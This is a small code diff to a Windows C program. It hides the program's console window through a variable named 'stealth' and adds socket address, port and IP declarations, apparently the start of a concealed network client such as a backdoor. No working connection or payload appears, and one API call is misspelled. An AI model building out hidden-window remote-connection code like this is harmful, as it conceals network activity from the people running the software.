@@ -16,5 +16,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   AlloConsole();
   stealth = FindWindowA("ConsoleWindowClass", NULL);
 
-  ShowWindow(stealth, 0)
+  ShowWindow(stealth, 0);
+
+  struct sockaddr_in SerAddr;
+  unsigned short ServPort;
+  char *ServIP;
 }
